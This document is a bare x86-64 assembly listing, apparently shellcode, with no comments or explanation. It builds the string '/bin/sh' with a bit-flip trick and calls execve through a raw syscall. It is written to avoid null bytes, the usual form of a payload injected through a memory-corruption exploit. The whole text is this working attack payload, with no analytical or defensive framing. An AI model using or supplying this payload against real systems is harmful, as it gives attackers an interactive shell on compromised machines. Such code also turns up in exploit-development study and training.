    BITS 64
    xor esi, esi
    push rsi
    mov rbx, 0x0068732f6e69622e
    or bl, 0x1
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
    
